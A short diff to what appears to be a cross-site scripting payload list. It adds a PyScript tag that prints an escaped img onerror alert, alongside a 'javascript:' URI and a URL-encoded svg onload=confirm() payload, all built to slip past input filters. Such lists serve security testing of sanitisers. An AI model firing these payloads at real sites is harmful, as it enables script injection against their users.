@@ -1,3 +1,5 @@
+<py-script>print('\74img/src/onerror\75alert(1)\76')</py-script>
+
 javascript:%ef%bb%bfalert(XSS)
 
 %3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F
